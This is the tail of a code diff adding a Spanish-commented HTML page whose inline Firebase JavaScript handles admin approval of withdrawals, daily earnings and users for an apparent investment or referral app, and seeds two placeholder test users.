+                            if (action === 'approve') {
+                                // Aprobar retiro - restar saldo
+                                const amount = withdrawRequests[requestIndex].amount;
+                                withdrawRequests[requestIndex].status = 'approved';
+                                
+                                // Actualizar usuario
+                                return db.collection('users').doc(userId).update({
+                                    withdrawRequests: withdrawRequests,
+                                    balance: firebase.firestore.FieldValue.increment(-amount)
+                                });
+                            } else {
+                                // Rechazar retiro
+                                withdrawRequests[requestIndex].status = 'rejected';
+                                return db.collection('users').doc(userId).update({
+                                    withdrawRequests: withdrawRequests
+                                });
+                            }
+                        }
+                    }
+                })
+                .then(() => {
+                    console.log(`Solicitud de retiro ${action === 'approve' ? 'aprobada' : 'rechazada'} correctamente.`);
+                })
+                .catch((error) => {
+                    console.error("Error al procesar solicitud de retiro:", error);
+                    throw error;
+                });
+        }
+
+        // Procesar ganancia diaria
+        function processEarningRequest(userId, earningId, action) {
+            return db.collection('users').doc(userId).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        const user = doc.data();
+                        const pendingEarnings = user.pendingEarnings || [];
+                        const earningIndex = pendingEarnings.findIndex(earning => earning.id === earningId);
+                        
+                        if (earningIndex !== -1) {
+                            if (action === 'approve') {
+                                // Aprobar ganancia - agregar a earnings
+                                const amount = pendingEarnings[earningIndex].amount;
+                                pendingEarnings[earningIndex].status = 'approved';
+                                
+                                // Actualizar usuario
+                                return db.collection('users').doc(userId).update({
+                                    pendingEarnings: pendingEarnings,
+                                    earnings: firebase.firestore.FieldValue.increment(amount)
+                                });
+                            } else {
+                                // Rechazar ganancia
+                                pendingEarnings[earningIndex].status = 'rejected';
+                                return db.collection('users').doc(userId).update({
+                                    pendingEarnings: pendingEarnings
+                                });
+                            }
+                        }
+                    }
+                })
+                .then(() => {
+                    console.log(`Ganancia diaria ${action === 'approve' ? 'aprobada' : 'rechazada'} correctamente.`);
+                })
+                .catch((error) => {
+                    console.error("Error al procesar ganancia diaria:", error);
+                    throw error;
+                });
+        }
+
+        // Aprobar usuario
+        function approveUser(userId) {
+            return db.collection('users').doc(userId).update({
+                status: "approved"
+            })
+            .then(() => {
+                console.log('Usuario aprobado exitosamente.');
+            })
+            .catch((error) => {
+                console.error("Error al aprobar usuario:", error);
+                throw error;
+            });
+        }
+
+        // Eliminar usuario
+        function deleteUser(userId) {
+            return db.collection('users').doc(userId).delete()
+                .then(() => {
+                    console.log('Usuario eliminado exitosamente.');
+                })
+                .catch((error) => {
+                    console.error("Error al eliminar usuario:", error);
+                    throw error;
+                });
+        }
+
+        // Verificar si hay un usuario autenticado al cargar la página
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                // Usuario ya ha iniciado sesión
+                db.collection('users').doc(user.uid).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        currentUser = { uid: doc.id, ...doc.data() };
+                        registerScreen.style.display = 'none';
+                        loginScreen.style.display = 'none';
+                        mainScreen.style.display = 'block';
+                        updatePersonalInfo();
+                        
+                        // Mostrar elementos solo para usuarios autenticados
+                        menuToggle.classList.add('visible');
+                        adminIcon.classList.add('visible');
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error al obtener datos del usuario:", error);
+                });
+            } else {
+                // No hay usuario autenticado
+                registerScreen.style.display = 'flex';
+                loginScreen.style.display = 'none';
+                mainScreen.style.display = 'none';
+                
+                // Ocultar elementos de usuario autenticado
+                menuToggle.classList.remove('visible');
+                adminIcon.classList.remove('visible');
+            }
+        });
+
+        // Función para agregar usuarios de prueba (solo para testing)
+        function addTestUsers() {
+            const testUsers = [
+                {
+                    email: "usuario1@ejemplo.com",
+                    phone: "809-123-4567",
+                    cedula: "001-1234567-8",
+                    balance: 5000,
+                    earnings: 250,
+                    referralEarnings: 0,
+                    status: "approved",
+                    registrationDate: new Date().toISOString(),
+                    referralCode: "TEST001"
+                },
+                {
+                    email: "usuario2@ejemplo.com", 
+                    phone: "809-234-5678",
+                    cedula: "001-2345678-9", 
+                    balance: 10000,
+                    earnings: 500,
+                    referralEarnings: 0,
+                    status: "pending",
+                    registrationDate: new Date().toISOString(),
+                    referralCode: "TEST002"
+                }
+            ];
+
+            testUsers.forEach((user, index) => {
+                db.collection('users').add(user);
+            });
+            
+            alert('Usuarios de prueba agregados correctamente.');
+        }
+
+        // Descomenta la siguiente línea para agregar usuarios de prueba (ejecutar solo una vez)
+        // addTestUsers();
+    </script>
+</body>
+</html>
